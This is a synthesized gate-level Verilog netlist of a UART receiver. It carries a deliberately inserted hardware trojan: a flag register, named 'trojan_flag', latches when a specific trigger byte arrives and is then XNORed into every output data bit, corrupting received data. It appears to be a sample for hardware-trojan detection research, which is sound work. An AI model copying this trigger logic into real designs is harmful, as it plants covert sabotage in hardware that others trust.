/* Generated by Yosys 0.9 (git sha1 1979e0b) */

module uart_rx(clk, resetn, uart_rxd, uart_rx_en, uart_rx_break, uart_rx_valid, uart_rx_data);
  wire [3:0] _000_;
  wire _001_;
  wire [13:0] _002_;
  wire [7:0] _003_;
  wire _004_;
  wire _005_;
  wire [7:0] _006_;
  wire [7:0] _007_;
  wire _008_;
  wire _009_;
  wire _010_;
  wire _011_;
  wire _012_;
  wire _013_;
  wire _014_;
  wire _015_;
  wire _016_;
  wire _017_;
  wire _018_;
  wire _019_;
  wire _020_;
  wire _021_;
  wire _022_;
  wire _023_;
  wire _024_;
  wire _025_;
  wire _026_;
  wire _027_;
  wire _028_;
  wire _029_;
  wire _030_;
  wire _031_;
  wire _032_;
  wire _033_;
  wire _034_;
  wire _035_;
  wire _036_;
  wire _037_;
  wire _038_;
  wire _039_;
  wire _040_;
  wire _041_;
  wire _042_;
  wire _043_;
  wire _044_;
  wire _045_;
  wire _046_;
  wire _047_;
  wire _048_;
  wire _049_;
  wire _050_;
  wire _051_;
  wire _052_;
  wire _053_;
  wire _054_;
  wire _055_;
  wire _056_;
  wire _057_;
  wire _058_;
  wire _059_;
  wire _060_;
  wire _061_;
  wire _062_;
  wire _063_;
  wire _064_;
  wire _065_;
  wire _066_;
  wire _067_;
  wire _068_;
  wire _069_;
  wire _070_;
  wire _071_;
  wire _072_;
  wire _073_;
  wire _074_;
  wire _075_;
  wire _076_;
  wire _077_;
  wire _078_;
  wire _079_;
  wire _080_;
  wire _081_;
  wire _082_;
  wire _083_;
  wire _084_;
  wire _085_;
  wire _086_;
  wire _087_;
  wire _088_;
  wire _089_;
  wire _090_;
  wire _091_;
  wire _092_;
  wire _093_;
  wire _094_;
  wire _095_;
  wire _096_;
  wire _097_;
  wire _098_;
  wire _099_;
  wire _100_;
  wire _101_;
  wire _102_;
  wire _103_;
  wire _104_;
  reg [3:0] bit_counter;
  reg bit_sample;
  input clk;
  reg [13:0] cycle_counter;
  reg [3:0] fsm_state;
  reg [7:0] received_data;
  input resetn;
  reg rxd_reg;
  reg rxd_reg_0;
  wire [7:0] trojan_flag;
  output uart_rx_break;
  output [7:0] uart_rx_data;
  reg [7:0] uart_rx_data;
  input uart_rx_en;
  output uart_rx_valid;
  input uart_rxd;
  sky130_fd_sc_hd__nand2_1 _105_ (
    .A(fsm_state[0]),
    .B(rxd_reg),
    .Y(_095_)
  );
  sky130_fd_sc_hd__nand2_1 _106_ (
    .A(cycle_counter[7]),
    .B(cycle_counter[8]),
    .Y(_096_)
  );
  sky130_fd_sc_hd__or4_1 _107_ (
    .A(cycle_counter[1]),
    .B(cycle_counter[0]),
    .C(cycle_counter[10]),
    .D(cycle_counter[13]),
    .X(_097_)
  );
  sky130_fd_sc_hd__nor2_1 _108_ (
    .A(_096_),
    .B(_097_),
    .Y(_098_)
  );
  sky130_fd_sc_hd__nand2_1 _109_ (
    .A(cycle_counter[9]),
    .B(cycle_counter[12]),
    .Y(_099_)
  );
  sky130_fd_sc_hd__nor3_1 _110_ (
    .A(cycle_counter[6]),
    .B(cycle_counter[11]),
    .C(_099_),
    .Y(_100_)
  );
  sky130_fd_sc_hd__nor4b_1 _111_ (
    .A(cycle_counter[2]),
    .B(cycle_counter[5]),
    .C(cycle_counter[4]),
    .D_N(cycle_counter[3]),
    .Y(_101_)
  );
  sky130_fd_sc_hd__or4b_1 _112_ (
    .A(cycle_counter[3]),
    .B(cycle_counter[5]),
    .C(cycle_counter[4]),
    .D_N(cycle_counter[2]),
    .X(_102_)
  );
  sky130_fd_sc_hd__nand4bb_1 _113_ (
    .A_N(cycle_counter[9]),
    .B_N(cycle_counter[12]),
    .C(cycle_counter[11]),
    .D(cycle_counter[6]),
    .Y(_103_)
  );
  sky130_fd_sc_hd__nor4_1 _114_ (
    .A(_096_),
    .B(_097_),
    .C(_102_),
    .D(_103_),
    .Y(_104_)
  );
  sky130_fd_sc_hd__a32o_1 _115_ (
    .A1(_098_),
    .A2(_100_),
    .A3(_101_),
    .B1(_104_),
    .B2(fsm_state[3]),
    .X(_012_)
  );
  sky130_fd_sc_hd__clkinv_1 _116_ (
    .A(_012_),
    .Y(_013_)
  );
  sky130_fd_sc_hd__nand2_1 _117_ (
    .A(fsm_state[3]),
    .B(_012_),
    .Y(_014_)
  );
  sky130_fd_sc_hd__nand3_1 _118_ (
    .A(resetn),
    .B(_095_),
    .C(_014_),
    .Y(_008_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _119_ (
    .A(resetn),
    .SLEEP(_012_),
    .X(_015_)
  );
  sky130_fd_sc_hd__nand2_1 _120_ (
    .A(resetn),
    .B(_013_),
    .Y(_016_)
  );
  sky130_fd_sc_hd__nor4b_1 _121_ (
    .A(bit_counter[1]),
    .B(bit_counter[0]),
    .C(bit_counter[2]),
    .D_N(bit_counter[3]),
    .Y(_017_)
  );
  sky130_fd_sc_hd__a32o_1 _122_ (
    .A1(resetn),
    .A2(fsm_state[1]),
    .A3(_017_),
    .B1(_015_),
    .B2(fsm_state[3]),
    .X(_011_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _123_ (
    .A(fsm_state[0]),
    .SLEEP(rxd_reg),
    .X(_018_)
  );
  sky130_fd_sc_hd__a22o_1 _124_ (
    .A1(fsm_state[2]),
    .A2(_015_),
    .B1(_018_),
    .B2(resetn),
    .X(_010_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _125_ (
    .A(fsm_state[1]),
    .SLEEP(_017_),
    .X(_019_)
  );
  sky130_fd_sc_hd__a21oi_1 _126_ (
    .A1(fsm_state[2]),
    .A2(_012_),
    .B1(_019_),
    .Y(_020_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _127_ (
    .A(resetn),
    .SLEEP(_020_),
    .X(_009_)
  );
  sky130_fd_sc_hd__nor4_1 _128_ (
    .A(fsm_state[1]),
    .B(fsm_state[2]),
    .C(_014_),
    .D(_018_),
    .Y(uart_rx_valid)
  );
  sky130_fd_sc_hd__nor4_1 _129_ (
    .A(received_data[2]),
    .B(received_data[3]),
    .C(received_data[0]),
    .D(received_data[1]),
    .Y(_021_)
  );
  sky130_fd_sc_hd__nor4_1 _130_ (
    .A(received_data[6]),
    .B(received_data[7]),
    .C(received_data[4]),
    .D(received_data[5]),
    .Y(_022_)
  );
  sky130_fd_sc_hd__and3_1 _131_ (
    .A(uart_rx_valid),
    .B(_021_),
    .C(_022_),
    .X(uart_rx_break)
  );
  sky130_fd_sc_hd__mux2i_1 _132_ (
    .A0(rxd_reg_0),
    .A1(uart_rxd),
    .S(uart_rx_en),
    .Y(_023_)
  );
  sky130_fd_sc_hd__nand2_1 _133_ (
    .A(resetn),
    .B(_023_),
    .Y(_005_)
  );
  sky130_fd_sc_hd__mux2i_1 _134_ (
    .A0(rxd_reg),
    .A1(rxd_reg_0),
    .S(uart_rx_en),
    .Y(_024_)
  );
  sky130_fd_sc_hd__nand2_1 _135_ (
    .A(resetn),
    .B(_024_),
    .Y(_004_)
  );
  sky130_fd_sc_hd__nor4_1 _136_ (
    .A(fsm_state[3]),
    .B(cycle_counter[0]),
    .C(fsm_state[1]),
    .D(fsm_state[2]),
    .Y(_025_)
  );
  sky130_fd_sc_hd__o31a_1 _137_ (
    .A1(fsm_state[3]),
    .A2(fsm_state[1]),
    .A3(fsm_state[2]),
    .B1(cycle_counter[0]),
    .X(_026_)
  );
  sky130_fd_sc_hd__nor3_1 _138_ (
    .A(_016_),
    .B(_025_),
    .C(_026_),
    .Y(_002_[0])
  );
  sky130_fd_sc_hd__o21ai_0 _139_ (
    .A1(cycle_counter[1]),
    .A2(_026_),
    .B1(resetn),
    .Y(_027_)
  );
  sky130_fd_sc_hd__a21oi_1 _140_ (
    .A1(cycle_counter[1]),
    .A2(_026_),
    .B1(_027_),
    .Y(_002_[1])
  );
  sky130_fd_sc_hd__and3_1 _141_ (
    .A(cycle_counter[1]),
    .B(cycle_counter[2]),
    .C(_026_),
    .X(_028_)
  );
  sky130_fd_sc_hd__a21oi_1 _142_ (
    .A1(cycle_counter[1]),
    .A2(_026_),
    .B1(cycle_counter[2]),
    .Y(_029_)
  );
  sky130_fd_sc_hd__nor3_1 _143_ (
    .A(_016_),
    .B(_028_),
    .C(_029_),
    .Y(_002_[2])
  );
  sky130_fd_sc_hd__and3_1 _144_ (
    .A(cycle_counter[1]),
    .B(cycle_counter[2]),
    .C(cycle_counter[3]),
    .X(_030_)
  );
  sky130_fd_sc_hd__nor2_1 _145_ (
    .A(cycle_counter[3]),
    .B(_028_),
    .Y(_031_)
  );
  sky130_fd_sc_hd__a211oi_1 _146_ (
    .A1(_026_),
    .A2(_030_),
    .B1(_031_),
    .C1(_016_),
    .Y(_002_[3])
  );
  sky130_fd_sc_hd__and3_1 _147_ (
    .A(cycle_counter[4]),
    .B(_026_),
    .C(_030_),
    .X(_032_)
  );
  sky130_fd_sc_hd__a21oi_1 _148_ (
    .A1(_026_),
    .A2(_030_),
    .B1(cycle_counter[4]),
    .Y(_033_)
  );
  sky130_fd_sc_hd__nor3b_1 _149_ (
    .A(_032_),
    .B(_033_),
    .C_N(resetn),
    .Y(_002_[4])
  );
  sky130_fd_sc_hd__o21ai_0 _150_ (
    .A1(cycle_counter[5]),
    .A2(_032_),
    .B1(resetn),
    .Y(_034_)
  );
  sky130_fd_sc_hd__a21oi_1 _151_ (
    .A1(cycle_counter[5]),
    .A2(_032_),
    .B1(_034_),
    .Y(_002_[5])
  );
  sky130_fd_sc_hd__nand2_1 _152_ (
    .A(cycle_counter[5]),
    .B(cycle_counter[6]),
    .Y(_035_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _153_ (
    .A(_032_),
    .SLEEP(_035_),
    .X(_036_)
  );
  sky130_fd_sc_hd__a21oi_1 _154_ (
    .A1(cycle_counter[5]),
    .A2(_032_),
    .B1(cycle_counter[6]),
    .Y(_037_)
  );
  sky130_fd_sc_hd__nor3_1 _155_ (
    .A(_016_),
    .B(_036_),
    .C(_037_),
    .Y(_002_[6])
  );
  sky130_fd_sc_hd__o21ai_0 _156_ (
    .A1(cycle_counter[7]),
    .A2(_036_),
    .B1(_015_),
    .Y(_038_)
  );
  sky130_fd_sc_hd__a21oi_1 _157_ (
    .A1(cycle_counter[7]),
    .A2(_036_),
    .B1(_038_),
    .Y(_002_[7])
  );
  sky130_fd_sc_hd__a21oi_1 _158_ (
    .A1(cycle_counter[7]),
    .A2(_036_),
    .B1(cycle_counter[8]),
    .Y(_039_)
  );
  sky130_fd_sc_hd__nor2b_1 _159_ (
    .A(_096_),
    .B_N(_036_),
    .Y(_040_)
  );
  sky130_fd_sc_hd__nor3_1 _160_ (
    .A(_016_),
    .B(_039_),
    .C(_040_),
    .Y(_002_[8])
  );
  sky130_fd_sc_hd__nor2_1 _161_ (
    .A(_096_),
    .B(_035_),
    .Y(_041_)
  );
  sky130_fd_sc_hd__and3_1 _162_ (
    .A(cycle_counter[9]),
    .B(_032_),
    .C(_041_),
    .X(_042_)
  );
  sky130_fd_sc_hd__o21ai_0 _163_ (
    .A1(cycle_counter[9]),
    .A2(_040_),
    .B1(_015_),
    .Y(_043_)
  );
  sky130_fd_sc_hd__nor2_1 _164_ (
    .A(_042_),
    .B(_043_),
    .Y(_002_[9])
  );
  sky130_fd_sc_hd__o21ai_0 _165_ (
    .A1(cycle_counter[10]),
    .A2(_042_),
    .B1(resetn),
    .Y(_044_)
  );
  sky130_fd_sc_hd__a21oi_1 _166_ (
    .A1(cycle_counter[10]),
    .A2(_042_),
    .B1(_044_),
    .Y(_002_[10])
  );
  sky130_fd_sc_hd__a21oi_1 _167_ (
    .A1(cycle_counter[10]),
    .A2(_042_),
    .B1(cycle_counter[11]),
    .Y(_045_)
  );
  sky130_fd_sc_hd__a311oi_1 _168_ (
    .A1(cycle_counter[11]),
    .A2(cycle_counter[10]),
    .A3(_042_),
    .B1(_045_),
    .C1(_016_),
    .Y(_002_[11])
  );
  sky130_fd_sc_hd__and4_1 _169_ (
    .A(cycle_counter[11]),
    .B(cycle_counter[10]),
    .C(cycle_counter[12]),
    .D(_042_),
    .X(_046_)
  );
  sky130_fd_sc_hd__a31oi_1 _170_ (
    .A1(cycle_counter[11]),
    .A2(cycle_counter[10]),
    .A3(_042_),
    .B1(cycle_counter[12]),
    .Y(_047_)
  );
  sky130_fd_sc_hd__nor3_1 _171_ (
    .A(_016_),
    .B(_046_),
    .C(_047_),
    .Y(_002_[12])
  );
  sky130_fd_sc_hd__xnor2_1 _172_ (
    .A(cycle_counter[13]),
    .B(_046_),
    .Y(_048_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _173_ (
    .A(resetn),
    .SLEEP(_048_),
    .X(_002_[13])
  );
  sky130_fd_sc_hd__nand2b_1 _174_ (
    .A_N(fsm_state[0]),
    .B(resetn),
    .Y(_049_)
  );
  sky130_fd_sc_hd__nor3_1 _175_ (
    .A(fsm_state[3]),
    .B(fsm_state[2]),
    .C(_049_),
    .Y(_050_)
  );
  sky130_fd_sc_hd__or3_1 _176_ (
    .A(fsm_state[3]),
    .B(fsm_state[2]),
    .C(_049_),
    .X(_051_)
  );
  sky130_fd_sc_hd__nand2_1 _177_ (
    .A(fsm_state[1]),
    .B(_012_),
    .Y(_052_)
  );
  sky130_fd_sc_hd__a21oi_1 _178_ (
    .A1(fsm_state[1]),
    .A2(_012_),
    .B1(bit_counter[0]),
    .Y(_053_)
  );
  sky130_fd_sc_hd__and3_1 _179_ (
    .A(fsm_state[1]),
    .B(bit_counter[0]),
    .C(_012_),
    .X(_054_)
  );
  sky130_fd_sc_hd__nor3_1 _180_ (
    .A(_051_),
    .B(_053_),
    .C(_054_),
    .Y(_000_[0])
  );
  sky130_fd_sc_hd__nor2_1 _181_ (
    .A(bit_counter[1]),
    .B(_054_),
    .Y(_055_)
  );
  sky130_fd_sc_hd__and4_1 _182_ (
    .A(fsm_state[1]),
    .B(bit_counter[1]),
    .C(bit_counter[0]),
    .D(_012_),
    .X(_056_)
  );
  sky130_fd_sc_hd__nor3_1 _183_ (
    .A(_051_),
    .B(_055_),
    .C(_056_),
    .Y(_000_[1])
  );
  sky130_fd_sc_hd__nand2_1 _184_ (
    .A(bit_counter[2]),
    .B(_056_),
    .Y(_057_)
  );
  sky130_fd_sc_hd__o211a_1 _185_ (
    .A1(bit_counter[2]),
    .A2(_056_),
    .B1(_057_),
    .C1(_050_),
    .X(_000_[2])
  );
  sky130_fd_sc_hd__a21oi_1 _186_ (
    .A1(bit_counter[2]),
    .A2(_056_),
    .B1(bit_counter[3]),
    .Y(_058_)
  );
  sky130_fd_sc_hd__a311oi_1 _187_ (
    .A1(bit_counter[2]),
    .A2(bit_counter[3]),
    .A3(_056_),
    .B1(_058_),
    .C1(_051_),
    .Y(_000_[3])
  );
  sky130_fd_sc_hd__xnor2_1 _188_ (
    .A(received_data[0]),
    .B(trojan_flag[0]),
    .Y(_059_)
  );
  sky130_fd_sc_hd__o21ai_0 _189_ (
    .A1(fsm_state[3]),
    .A2(uart_rx_data[0]),
    .B1(resetn),
    .Y(_060_)
  );
  sky130_fd_sc_hd__a21oi_1 _190_ (
    .A1(fsm_state[3]),
    .A2(_059_),
    .B1(_060_),
    .Y(_007_[0])
  );
  sky130_fd_sc_hd__xnor2_1 _191_ (
    .A(received_data[1]),
    .B(trojan_flag[0]),
    .Y(_061_)
  );
  sky130_fd_sc_hd__o21ai_0 _192_ (
    .A1(fsm_state[3]),
    .A2(uart_rx_data[1]),
    .B1(resetn),
    .Y(_062_)
  );
  sky130_fd_sc_hd__a21oi_1 _193_ (
    .A1(fsm_state[3]),
    .A2(_061_),
    .B1(_062_),
    .Y(_007_[1])
  );
  sky130_fd_sc_hd__xnor2_1 _194_ (
    .A(received_data[2]),
    .B(trojan_flag[0]),
    .Y(_063_)
  );
  sky130_fd_sc_hd__o21ai_0 _195_ (
    .A1(fsm_state[3]),
    .A2(uart_rx_data[2]),
    .B1(resetn),
    .Y(_064_)
  );
  sky130_fd_sc_hd__a21oi_1 _196_ (
    .A1(fsm_state[3]),
    .A2(_063_),
    .B1(_064_),
    .Y(_007_[2])
  );
  sky130_fd_sc_hd__xnor2_1 _197_ (
    .A(received_data[3]),
    .B(trojan_flag[0]),
    .Y(_065_)
  );
  sky130_fd_sc_hd__o21ai_0 _198_ (
    .A1(fsm_state[3]),
    .A2(uart_rx_data[3]),
    .B1(resetn),
    .Y(_066_)
  );
  sky130_fd_sc_hd__a21oi_1 _199_ (
    .A1(fsm_state[3]),
    .A2(_065_),
    .B1(_066_),
    .Y(_007_[3])
  );
  sky130_fd_sc_hd__xnor2_1 _200_ (
    .A(received_data[4]),
    .B(trojan_flag[0]),
    .Y(_067_)
  );
  sky130_fd_sc_hd__o21ai_0 _201_ (
    .A1(fsm_state[3]),
    .A2(uart_rx_data[4]),
    .B1(resetn),
    .Y(_068_)
  );
  sky130_fd_sc_hd__a21oi_1 _202_ (
    .A1(fsm_state[3]),
    .A2(_067_),
    .B1(_068_),
    .Y(_007_[4])
  );
  sky130_fd_sc_hd__xnor2_1 _203_ (
    .A(received_data[5]),
    .B(trojan_flag[0]),
    .Y(_069_)
  );
  sky130_fd_sc_hd__o21ai_0 _204_ (
    .A1(fsm_state[3]),
    .A2(uart_rx_data[5]),
    .B1(resetn),
    .Y(_070_)
  );
  sky130_fd_sc_hd__a21oi_1 _205_ (
    .A1(fsm_state[3]),
    .A2(_069_),
    .B1(_070_),
    .Y(_007_[5])
  );
  sky130_fd_sc_hd__xnor2_1 _206_ (
    .A(received_data[6]),
    .B(trojan_flag[0]),
    .Y(_071_)
  );
  sky130_fd_sc_hd__o21ai_0 _207_ (
    .A1(fsm_state[3]),
    .A2(uart_rx_data[6]),
    .B1(resetn),
    .Y(_072_)
  );
  sky130_fd_sc_hd__a21oi_1 _208_ (
    .A1(fsm_state[3]),
    .A2(_071_),
    .B1(_072_),
    .Y(_007_[6])
  );
  sky130_fd_sc_hd__xnor2_1 _209_ (
    .A(received_data[7]),
    .B(trojan_flag[0]),
    .Y(_073_)
  );
  sky130_fd_sc_hd__o21ai_0 _210_ (
    .A1(fsm_state[3]),
    .A2(uart_rx_data[7]),
    .B1(resetn),
    .Y(_074_)
  );
  sky130_fd_sc_hd__a21oi_1 _211_ (
    .A1(fsm_state[3]),
    .A2(_073_),
    .B1(_074_),
    .Y(_007_[7])
  );
  sky130_fd_sc_hd__nand4b_1 _212_ (
    .A_N(received_data[2]),
    .B(received_data[3]),
    .C(received_data[0]),
    .D(received_data[1]),
    .Y(_075_)
  );
  sky130_fd_sc_hd__nand2_1 _213_ (
    .A(received_data[7]),
    .B(received_data[5]),
    .Y(_076_)
  );
  sky130_fd_sc_hd__nor4_1 _214_ (
    .A(received_data[6]),
    .B(received_data[4]),
    .C(_075_),
    .D(_076_),
    .Y(_077_)
  );
  sky130_fd_sc_hd__o21a_1 _215_ (
    .A1(trojan_flag[0]),
    .A2(_077_),
    .B1(resetn),
    .X(_006_[0])
  );
  sky130_fd_sc_hd__mux2i_1 _216_ (
    .A0(bit_sample),
    .A1(rxd_reg),
    .S(_104_),
    .Y(_078_)
  );
  sky130_fd_sc_hd__lpflow_isobufsrc_1 _217_ (
    .A(resetn),
    .SLEEP(_078_),
    .X(_001_)
  );
  sky130_fd_sc_hd__nand3_1 _218_ (
    .A(fsm_state[1]),
    .B(received_data[2]),
    .C(_012_),
    .Y(_079_)
  );
  sky130_fd_sc_hd__nand2_1 _219_ (
    .A(received_data[1]),
    .B(_052_),
    .Y(_080_)
  );
  sky130_fd_sc_hd__a21oi_1 _220_ (
    .A1(_079_),
    .A2(_080_),
    .B1(_049_),
    .Y(_003_[1])
  );
  sky130_fd_sc_hd__nand3_1 _221_ (
    .A(fsm_state[1]),
    .B(received_data[1]),
    .C(_012_),
    .Y(_081_)
  );
  sky130_fd_sc_hd__nand2_1 _222_ (
    .A(received_data[0]),
    .B(_052_),
    .Y(_082_)
  );
  sky130_fd_sc_hd__a21oi_1 _223_ (
    .A1(_081_),
    .A2(_082_),
    .B1(_049_),
    .Y(_003_[0])
  );
  sky130_fd_sc_hd__nand2_1 _224_ (
    .A(received_data[2]),
    .B(_052_),
    .Y(_083_)
  );
  sky130_fd_sc_hd__nand3_1 _225_ (
    .A(fsm_state[1]),
    .B(received_data[3]),
    .C(_012_),
    .Y(_084_)
  );
  sky130_fd_sc_hd__a21oi_1 _226_ (
    .A1(_083_),
    .A2(_084_),
    .B1(_049_),
    .Y(_003_[2])
  );
  sky130_fd_sc_hd__nand2_1 _227_ (
    .A(received_data[3]),
    .B(_052_),
    .Y(_085_)
  );
  sky130_fd_sc_hd__nand3_1 _228_ (
    .A(fsm_state[1]),
    .B(received_data[4]),
    .C(_012_),
    .Y(_086_)
  );
  sky130_fd_sc_hd__a21oi_1 _229_ (
    .A1(_085_),
    .A2(_086_),
    .B1(_049_),
    .Y(_003_[3])
  );
  sky130_fd_sc_hd__nand3_1 _230_ (
    .A(fsm_state[1]),
    .B(received_data[5]),
    .C(_012_),
    .Y(_087_)
  );
  sky130_fd_sc_hd__nand2_1 _231_ (
    .A(received_data[4]),
    .B(_052_),
    .Y(_088_)
  );
  sky130_fd_sc_hd__a21oi_1 _232_ (
    .A1(_087_),
    .A2(_088_),
    .B1(_049_),
    .Y(_003_[4])
  );
  sky130_fd_sc_hd__nand3_1 _233_ (
    .A(fsm_state[1]),
    .B(received_data[6]),
    .C(_012_),
    .Y(_089_)
  );
  sky130_fd_sc_hd__nand2_1 _234_ (
    .A(received_data[5]),
    .B(_052_),
    .Y(_090_)
  );
  sky130_fd_sc_hd__a21oi_1 _235_ (
    .A1(_089_),
    .A2(_090_),
    .B1(_049_),
    .Y(_003_[5])
  );
  sky130_fd_sc_hd__nand2_1 _236_ (
    .A(received_data[6]),
    .B(_052_),
    .Y(_091_)
  );
  sky130_fd_sc_hd__nand3_1 _237_ (
    .A(fsm_state[1]),
    .B(received_data[7]),
    .C(_012_),
    .Y(_092_)
  );
  sky130_fd_sc_hd__a21oi_1 _238_ (
    .A1(_091_),
    .A2(_092_),
    .B1(_049_),
    .Y(_003_[6])
  );
  sky130_fd_sc_hd__nand3_1 _239_ (
    .A(fsm_state[1]),
    .B(bit_sample),
    .C(_012_),
    .Y(_093_)
  );
  sky130_fd_sc_hd__nand2_1 _240_ (
    .A(received_data[7]),
    .B(_052_),
    .Y(_094_)
  );
  sky130_fd_sc_hd__a21oi_1 _241_ (
    .A1(_093_),
    .A2(_094_),
    .B1(_049_),
    .Y(_003_[7])
  );
  always @(posedge clk)
      fsm_state[0] <= _008_;
  always @(posedge clk)
      fsm_state[1] <= _009_;
  always @(posedge clk)
      fsm_state[2] <= _010_;
  always @(posedge clk)
      fsm_state[3] <= _011_;
  reg \trojan_flag_reg[0] ;
  always @(posedge clk)
      \trojan_flag_reg[0]  <= _006_[0];
  assign trojan_flag[0] = \trojan_flag_reg[0] ;
  always @(posedge clk)
      rxd_reg <= _004_;
  always @(posedge clk)
      rxd_reg_0 <= _005_;
  always @(posedge clk)
      cycle_counter[0] <= _002_[0];
  always @(posedge clk)
      cycle_counter[1] <= _002_[1];
  always @(posedge clk)
      cycle_counter[2] <= _002_[2];
  always @(posedge clk)
      cycle_counter[3] <= _002_[3];
  always @(posedge clk)
      cycle_counter[4] <= _002_[4];
  always @(posedge clk)
      cycle_counter[5] <= _002_[5];
  always @(posedge clk)
      cycle_counter[6] <= _002_[6];
  always @(posedge clk)
      cycle_counter[7] <= _002_[7];
  always @(posedge clk)
      cycle_counter[8] <= _002_[8];
  always @(posedge clk)
      cycle_counter[9] <= _002_[9];
  always @(posedge clk)
      cycle_counter[10] <= _002_[10];
  always @(posedge clk)
      cycle_counter[11] <= _002_[11];
  always @(posedge clk)
      cycle_counter[12] <= _002_[12];
  always @(posedge clk)
      cycle_counter[13] <= _002_[13];
  always @(posedge clk)
      bit_sample <= _001_;
  always @(posedge clk)
      bit_counter[0] <= _000_[0];
  always @(posedge clk)
      bit_counter[1] <= _000_[1];
  always @(posedge clk)
      bit_counter[2] <= _000_[2];
  always @(posedge clk)
      bit_counter[3] <= _000_[3];
  always @(posedge clk)
      received_data[0] <= _003_[0];
  always @(posedge clk)
      received_data[1] <= _003_[1];
  always @(posedge clk)
      received_data[2] <= _003_[2];
  always @(posedge clk)
      received_data[3] <= _003_[3];
  always @(posedge clk)
      received_data[4] <= _003_[4];
  always @(posedge clk)
      received_data[5] <= _003_[5];
  always @(posedge clk)
      received_data[6] <= _003_[6];
  always @(posedge clk)
      received_data[7] <= _003_[7];
  always @(posedge clk)
      uart_rx_data[0] <= _007_[0];
  always @(posedge clk)
      uart_rx_data[1] <= _007_[1];
  always @(posedge clk)
      uart_rx_data[2] <= _007_[2];
  always @(posedge clk)
      uart_rx_data[3] <= _007_[3];
  always @(posedge clk)
      uart_rx_data[4] <= _007_[4];
  always @(posedge clk)
      uart_rx_data[5] <= _007_[5];
  always @(posedge clk)
      uart_rx_data[6] <= _007_[6];
  always @(posedge clk)
      uart_rx_data[7] <= _007_[7];
endmodule